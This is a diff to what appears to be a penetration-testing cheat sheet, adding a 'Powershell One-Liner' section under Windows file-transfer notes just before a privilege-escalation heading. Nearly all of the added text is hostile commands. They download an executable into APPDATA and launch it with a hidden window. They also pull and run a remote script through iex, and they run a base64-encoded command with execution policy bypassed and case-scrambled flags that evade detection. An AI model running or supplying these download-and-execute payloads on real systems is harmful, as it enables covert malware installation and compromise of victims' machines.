@@ -772,6 +772,18 @@ For old windows machines
     Also works as oneliner 
     echo $storage = $pwd&$webclient = New-Object System.Net.Webclient&$url = "http://<ip>/exploit.php"&$file = "exploit.php"&$webclient.DownloadFile($url,$file) >> get.ps1
 
+*Powershell One-Liner*
+
+    powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('<url>',"$env:APPDATA\ps.exe");Start-Process ("$env:APPDATA\ps.exe")
+
+
+    ## Version1
+    c:\Windows\System32\cmd.exe /c powershell.exe -w hidden -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString('<url>')"
+
+
+    ## Version2
+    c:\windows\system32\cmd.exe /c PowErsHelL.EXE -eXecUtiONPoLICy bYPass -NOPROfilE -WinDoWSTYlE hiDden -EnCodeDcOmmAnd <base64 Command>
+
 
 **Privilege Escalation**
 
